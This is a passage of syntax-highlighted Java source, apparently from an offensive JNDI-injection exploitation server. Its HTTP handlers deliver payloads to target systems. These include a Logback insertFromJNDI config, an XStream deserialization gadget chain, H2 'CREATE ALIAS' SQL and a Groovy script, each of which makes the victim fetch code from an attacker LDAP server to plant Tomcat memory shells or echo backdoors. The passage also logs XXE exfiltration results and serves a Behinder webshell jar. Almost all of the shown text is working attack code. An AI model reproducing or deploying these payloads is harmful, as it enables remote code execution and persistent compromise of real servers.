class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes1);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleXMLRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line"><span class="comment">//        String host = exchange.getRequestURI().getHost();</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">xmlName</span> <span class="operator">=</span> path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="string">&quot;&lt;configuration&gt;\n  &lt;insertFromJNDI env-entry-name=\&quot;ldap://&quot;</span> + Config.ip + <span class="string">&quot;:&quot;</span>+ Config.ldapPort + <span class="string">&quot;/TomcatBypass/TomcatMemshell3\&quot; as=\&quot;appName\&quot; /&gt;\n&lt;/configuration&gt;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">xstream</span> <span class="operator">=</span> <span class="string">&quot;&lt;linked-hash-set&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;jdk.nashorn.internal.objects.NativeString&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;flags&gt;0&lt;/flags&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;value class=\&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;dataHandler&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;dataSource class=\&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;is class=\&quot;javax.crypto.CipherInputStream\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;cipher class=\&quot;javax.crypto.NullCipher\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;initialized&gt;false&lt;/initialized&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;opmode&gt;0&lt;/opmode&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;serviceIterator class=\&quot;javax.imageio.spi.FilterIterator\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;iter class=\&quot;javax.imageio.spi.FilterIterator\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;iter class=\&quot;java.util.Collections$EmptyIterator\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;next class=\&quot;com.sun.rowset.JdbcRowSetImpl\&quot; serialization=\&quot;custom\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;javax.sql.rowset.BaseRowSet&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;concurrency&gt;1008&lt;/concurrency&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;escapeProcessing&gt;true&lt;/escapeProcessing&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;fetchDir&gt;1000&lt;/fetchDir&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;fetchSize&gt;0&lt;/fetchSize&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;isolation&gt;2&lt;/isolation&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;maxFieldSize&gt;0&lt;/maxFieldSize&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;maxRows&gt;0&lt;/maxRows&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;queryTimeout&gt;0&lt;/queryTimeout&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;readOnly&gt;true&lt;/readOnly&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;rowSetType&gt;1004&lt;/rowSetType&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;showDeleted&gt;false&lt;/showDeleted&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;dataSource&gt;ldap://&quot;</span> + Config.ip + <span class="string">&quot;:1389/basic/TomcatMemShell3&lt;/dataSource&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;listeners/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;params/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;/default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;/javax.sql.rowset.BaseRowSet&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;com.sun.rowset.JdbcRowSetImpl&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;iMatchColumns&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;/iMatchColumns&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;strMatchColumns&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;/strMatchColumns&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;/default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;/com.sun.rowset.JdbcRowSetImpl&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;/next&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;/iter&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;filter class=\&quot;javax.imageio.ImageIO$ContainsFilter\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;method&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;class&gt;com.sun.rowset.JdbcRowSetImpl&lt;/class&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;name&gt;getDatabaseMetaData&lt;/name&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;parameter-types/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;/method&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;name&gt;foo&lt;/name&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;/filter&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;next class=\&quot;string\&quot;&gt;foo&lt;/next&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;/serviceIterator&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;lock/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;/cipher&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;input class=\&quot;java.lang.ProcessBuilder$NullInputStream\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;ibuffer&gt;&lt;/ibuffer&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;done&gt;false&lt;/done&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;ostart&gt;0&lt;/ostart&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;ofinish&gt;0&lt;/ofinish&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;closed&gt;false&lt;/closed&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;/is&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;consumed&gt;false&lt;/consumed&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;/dataSource&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;transferFlavors/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;/dataHandler&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;dataLen&gt;0&lt;/dataLen&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;/value&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;/jdk.nashorn.internal.objects.NativeString&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;jdk.nashorn.internal.objects.NativeString reference=\&quot;../jdk.nashorn.internal.objects.NativeString\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;jdk.nashorn.internal.objects.NativeString reference=\&quot;../../entry/jdk.nashorn.internal.objects.NativeString\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;jdk.nashorn.internal.objects.NativeString reference=\&quot;../../entry/jdk.nashorn.internal.objects.NativeString\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;/entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/linked-hash-set&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(xmlName.equals(<span class="string">&quot;a&quot;</span>)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.getBytes().length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (xmlName.equals(<span class="string">&quot;x&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line">            exchange.getResponseHeaders().add(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/xml; charset=utf-8&quot;</span>);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, xstream.getBytes().length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(xstream.getBytes(StandardCharsets.UTF_8));</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">pa</span> <span class="operator">=</span> cwd + File.separator + <span class="string">&quot;data&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pa + File.separator + xmlName + <span class="string">&quot;.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes1 = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                    fileInputStream.read(bytes1);</span><br><span class="line">                &#125;</span><br><span class="line">                exchange.getResponseHeaders().add(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/xml; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="comment">//                exchange.getResponseHeaders().set(&quot;Content-type&quot;,&quot;application/octet-stream&quot;);</span></span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes1);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleSQLRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> exchange.getRequestURI().getHost();</span><br><span class="line">        <span class="type">String</span> <span class="variable">sqlName</span> <span class="operator">=</span> path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(sqlName.equalsIgnoreCase(<span class="string">&quot;echo&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> String.valueOf(System.nanoTime());</span><br><span class="line">            <span class="type">String</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="string">&quot;CREATE ALIAS &quot;</span> + name + <span class="string">&quot; AS CONCAT(&#x27;void ex()throws Exception&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&#123;Object o = com.sun.rowset.JdbcRowSetImpl();&#x27;,&#x27; o.setDataSourceName(\&quot;ldap://&quot;</span> + host + <span class="string">&quot;:1389/TomcatBypass/TomcatEcho\&quot;);&#x27;,&#x27; &#x27;o.setAutoCommit(\&quot;true\&quot;);,&#x27;&#125;&#x27;);&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;CALL &quot;</span> + name + <span class="string">&quot;();\&quot;&#125;&quot;</span>;</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.getBytes().length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sqlName.equalsIgnoreCase(<span class="string">&quot;inject&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> String.valueOf(System.nanoTime());</span><br><span class="line">            <span class="type">String</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="string">&quot;CREATE ALIAS &quot;</span> + name + <span class="string">&quot; AS CONCAT(&#x27;void ex()throws Exception&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&#123;Object o = com.sun.rowset.JdbcRowSetImpl();&#x27;,&#x27; o.setDataSourceName(\&quot;ldap:// + host + :1389/inject.class\&quot;);&#x27;,&#x27; &#x27;o.setAutoCommit(\&quot;true\&quot;);,&#x27;&#125;&#x27;);&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;CALL &quot;</span> + name + <span class="string">&quot;();\&quot;&#125;&quot;</span>;</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.getBytes().length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">pa</span> <span class="operator">=</span> cwd + File.separator + <span class="string">&quot;data&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pa + File.separator + sqlName + <span class="string">&quot;.sql&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                    fileInputStream.read(bytes);</span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">//                exchange.getResponseHeaders().set(&quot;Content-type&quot;,&quot;application/octet-stream&quot;);</span></span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handlerGroovyRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> exchange.getRequestURI().getHost();</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;/TomcatBypass/TomcatEcho&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">groovyName</span> <span class="operator">=</span> path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(groovyName.equalsIgnoreCase(<span class="string">&quot;groovyecho&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="string">&quot;class demo &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    static void main()&#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        com.sun.rowset.JdbcRowSetImpl o = new com.sun.rowset.JdbcRowSetImpl();\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        o.setDataSourceName(\&quot;ldap://&quot;</span> + host + <span class="string">&quot;:1389&quot;</span> + exp + <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        o.setAutoCommit(true);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&#125;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.getBytes().length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">pa</span> <span class="operator">=</span> cwd + File.separator + <span class="string">&quot;data&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pa + File.separator + groovyName + <span class="string">&quot;.groovy&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                    fileInputStream.read(bytes);</span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">//                exchange.getResponseHeaders().set(&quot;Content-type&quot;,&quot;application/octet-stream&quot;);</span></span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleXXELogRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">exchangeImpl</span> <span class="operator">=</span> FieldUtils.readField(exchange, <span class="string">&quot;impl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">request</span> <span class="operator">=</span> FieldUtils.readField(exchangeImpl, <span class="string">&quot;req&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">startLine</span> <span class="operator">=</span> (String) FieldUtils.readField(request, <span class="string">&quot;startLine&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[+] XXE Attack Result: &quot;</span> + startLine);</span><br><span class="line">        exchange.sendResponseHeaders(<span class="number">200</span>, <span class="number">0</span>);</span><br><span class="line">        exchange.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleJarRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">jarName</span> <span class="operator">=</span> path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (jarName.equalsIgnoreCase(<span class="string">&quot;behinder3&quot;</span>))&#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes =  <span class="literal">null</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span>  cwd + File.separator +<span class="string">&quot;data&quot;</span> + File.separator + <span class="string">&quot;behinder3.jar&quot;</span>;</span><br><span class="line">            <span class="type">FileReader</span> <span class="variable">fileReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileReader</span>(filename,<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            bytes = fileReader.readBytes();</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span>  cwd + File.separator +<span class="string">&quot;data&quot;</span> + File.separator + jarName + <span class="string">&quot;.jar&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filename);</span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes =  <span class="literal">null</span>;</span><br><span class="line">                <span class="type">FileReader</span> <span class="variable">fileReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileReader</span>(filename,<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">                bytes = fileReader.readBytes();</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, bytes.length + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleClassRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Receive ClassRequest: &quot;</span> + className + <span class="string">&quot;.class&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//先从Cache中加载</span></span><br><span class="line">        <span class="keyword">if</span>(Cache.contains(className))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">byte</span>[] bytes = Cache.get(className);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.length);</span><br><span class="line">            <span class="comment">//这一步返回http请求</span></span><br><span class="line">            exchange.getResponseBody().write(bytes);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">//找不到就从/data目录下照</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">pa</span> <span class="operator">=</span> cwd + File.separator + <span class="string">&quot;data&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pa + File.separator + className + <span class="string">&quot;.class&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">                <span class="type">byte</span>[] 